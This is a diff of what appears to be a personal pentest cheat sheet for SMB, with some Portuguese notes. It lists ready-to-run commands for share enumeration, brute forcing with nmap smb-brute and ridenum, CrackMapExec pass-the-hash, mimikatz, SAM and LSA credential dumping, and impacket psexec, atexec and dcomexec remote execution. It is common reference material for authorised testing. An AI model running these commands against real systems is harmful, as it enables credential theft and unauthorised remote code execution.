@@ -1,7 +1,19 @@
 % smb, enum
 
+# Nmap Scan for Open SMB Shares
+nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 <IP_ou_range>
+
+# Nmap scans for vulnerable SMB Servers
+nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 <IP>
+
+# Nmap find exposed Netbios serversn
+sudo map -sU --script nbstat.nse -p 137 <IP>
+
+# Nmap SMB OS Discovery
+sudo nmap --script smb-os-discovery.nse <IP>
+
 # Nmap simple Scan for SMB Shares
-nmap -Pn -p 445 --script=smb-enum-shares IP
+nmap -Pn -p 445 --script=smb-enum-shares <IP>
 
 # Nmap NSE all scripts
 nmap --script smb-* -p 139,445, <IP>
@@ -26,6 +38,12 @@ nbtscan -r <IP>
 
 # enum4linux Null Session Enumeration 
 enum4linux -a <IP>
+
+# enum4linux with user and password
+enum4linux -a -u <user> -p <password> <ip>
+
+# enum4linux
+enum4linux -Madl
 
 # Nmap SMB NSE Scripts 
 nmap -v -p 139,445 <IP> --script smb-os-discovery.nse
@@ -105,211 +123,27 @@ smbmap -H <IP>
 # SMB Mount
 mount.cifs //$IP/<sharename>/ /mnt/shares/<sharename> -o username=<user>,pass=<password>
 
---------------------------------------------------------------------------------------------------- parei aqui
+# SMB Mount script
+mkdir <diretorio_local> && mount -t cifs \\\\<IP>\\www <diretorio_local> && cd <diretorio_local> && ls -las
 
-```text
-mkdir /mnt/www
-mount -t cifs \\\\<IP>\\www /mnt/www
-cd /mnt/www && ls -las
-```
+# BruteForce with Nmap
+sudo nmap --script smb-brute -p 445 <IP>
 
+# BruteForce with ridenum
+ridenum.py <IP> 500 50000 <password_wordlist> 
 
-- [ ] CrackMapExec: 
-
-```text
+# Crackmapexec SMB list
 crackmapexec smb -L 
-crackmapexec 172.21.0.0 -u Administrator -H [hash] --local-auth
-crackmapexec 172.21.0.0 -u Administrator -H [hash] --share
-crackmapexec smb 172.21.0.0/24 -u user -p 'Password' --local-auth -M mimikatz
 
+# Crackmapexec local auth
+crackmapexec <IP> -u <user> -H <hash> --local-auth
 
-## Upload
+# Crackmapexec share
+crackmapexec <IP> -u <user> -H <hash> --share
 
-```text
-curl --upload-file <file> -u '<user>' smb://$IP/<sharename>/
-```
+# Crackmapexec with Mimikatz
+crackmapexec smb <IP_ou_range> -u <user> -p <password> --local-auth -M mimikatz
 
-## SMB OS Discovery
-
-```text
-sudo nmap --script smb-os-discovery.nse <IP>
-```
-
-## Nmap port scan
-
-```text
-sudo nmap -v -p 139,445 -oG smb.txt $ip-254
-```
-
-## Netbios Information Scanning
-
-```text
-sudo nbtscan -r $ip/24
-```
-
-## Nmap find exposed Netbios serversn
-
-```text
-sudo map -sU --script nbstat.nse -p 137 $ip
-```
-
-## Nmap all SMB scripts scan
-
-```text
-sudo nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip
-```
-
-## Nmap all SMB scripts authenticated scan
-
-```text
-sudo nmap -sV -Pn -vv -p 445 --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip
-```
-
-## SMB Enumeration Tools
-
-skipping 1 line
-
-```text
-smbclient //MOUNT/share -I $ip -N
-```
-
-```text
-rpcclient -U "" $ip
-```
-
-## SMB Finger Printing
-
-```text
-smbclient -L //$ip
-```
-
-## Nmap Scan for Open SMB Shares
-
-```text
-nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24
-```
-
-## Nmap scans for vulnerable SMB Servers
-
-```text
-nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip
-```
-
-## Nmap List all SMB scripts installed
-
-```text
-ls -l /usr/share/nmap/scripts/smb*
-```
-
-## Enumerate SMB Users
-
-```text
-nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14
-OR
-python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip
-```
-
-## RID Cycling - Null Sessions
-
-```text
-ridenum.py $ip 500 50000 dict.txt
-```
-
-## Manual Null Session Testing
-
-```text
-Windows: 
-net use \\$ip\IPC$ "" /u:""
-Linux: 
-smbclient -L //$ip
-```
-
-```text
-ls /usr/share/nmap/scripts# ls | grep smb
-```
-
-```text
-enum4linux -a <ip>
-enum4linux -a -u <user> -p <password> <ip>
-enum4linux -a -u <user> -p "" <ip>
-enum4linux -Madl
-```
-
-```text
-nbtscan -r IP/24
-```
-
-```text
-sudo nmap -v --open -sS -Pn -p 139,445 <IP>
-sudo nmap -Pn -p 445 --script=smb-enum-shares IP
-```
-
-## List Shared Folder
-
-```text
-smbclient --no-pass -L //<IP> # Null user
-smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
-smbmap -H <IP> [-P <PORT>] #Null user
-smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
-smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
-crackmapexec smb <IP> -u '' -p '' --shares #Null user
-crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
-```
-
-## Connect using smbclient
-
-```text
-smbclient --no-pass //<IP>/<Folder>
-smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
-```
-Use --no-pass -c 'recurse;ls' to list recursively with smbclient
-
-## List with smbmap, without folder it list everything
-
-```text
-smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
-smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
-smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
-```
-
-## Mount a shared folder
-
-```text
-mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share
-```
-
-## Download files
-
-```text
-sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
-
-smbget -R smb://IP/<share path> -U <user>
-```
-
-## Download all
-
-```text
-smbclient //<IP>/<share>
-
-> recurse ON
-> prompt OFF
-> mget *
-```
-
-## ATExec
-Execute commands via the Task Scheduler (using \pipe\atsvc via SMB). In kali it is located on /usr/share/doc/python3-impacket/examples/
-
-```text
-./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
-./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
-```
-
-## Autenticate using Kerberos
-
-```text
-smbclient --kerberos //ws01win10.domain.com/C$
-rpcclient -k ws01win10.domain.com
-```
 
 ```text
 apt-get install crackmapexec
@@ -318,28 +152,62 @@ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
 crackmapexec 192.168.10.11 -u Administrator -H <NTHASH> -x whoami
 ``` 
 
-## Pass-the-Hash
-
-- see: https://github.com/SecureAuthCorp/impacket/pull/381
-- see: https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/
-
-## Using --exec-method -1,2,3 wmiexec,atexec,smbexec
 
 ```text
 crackmapexec -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
 crackmapexec -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
 ```
 
-## psexec/smbexec
+# Curl SMB Upload file
+curl --upload-file <file> -u '<user>' smb://<IP>/<sharename>/
 
-If no password is provided, it will be prompted
+# smbmap Download files
+sudo smbmap -R Folder -H <IP> -A <FileName> -q 
 
+# smbget Download files
+smbget -R smb://IP/<share path> -U <user>
+
+# Pass-the-Hash
+echo "see https://github.com/SecureAuthCorp/impacket/pull/381 and https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/"
+
+# ATExec
+./atexec.py <dominio>/<username>:<password>@<targetName or address> "command"
+
+# ATExec pass-the-hash
+./atexec.py -hashes <LM_NT> <user>@<IP> "whoami"
+
+# smbclient Autenticate using Kerberos
+smbclient --kerberos //<domain>/<share>
+
+# rpcclient Autenticate using Kerberos
+rpcclient -k <domain>
+
+# dcomexec
+./dcomexec.py <dominio>/<username>:<password>@<targetName_or_address>
+
+# dcomexec pass-the-hash
+./dcomexec.py -hashes <LM_NT> <user>@<IP>
+
+# psexec
 ```text
 ./psexec.py [[domain/]username[:password]@]<targetName or address>
 ./psexec.py -hashes <LM:NT> administrator@IP #Pass-the-Hash
 psexec \\IP -u Administrator -p 123456Ww
 psexec \\IP -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
 ```
+
+--------------------------------------------------------------------------------------------------- parei aqui
+
+
+
+## Using --exec-method -1,2,3 wmiexec,atexec,smbexec
+
+
+## psexec/smbexec
+
+If no password is provided, it will be prompted
+
+
 
 ## wmiexec/dcomexec
 
@@ -363,16 +231,3 @@ Using parameter-k  you can authenticate against kerberos instead of NTLM
 
 If no password is provided, it will be prompted
 
-```text
-./dcomexec.py [[domain/]username[:password]@]<targetName or address>
-./dcomexec.py -hashes <LM:NT> administrator@IP #Pass-the-Hash
-```
-
-You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompte
-
-## BruteForce
-
-```text
-sudo nmap --script smb-brute -p 445 <IP>
-ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce eachusername
-```
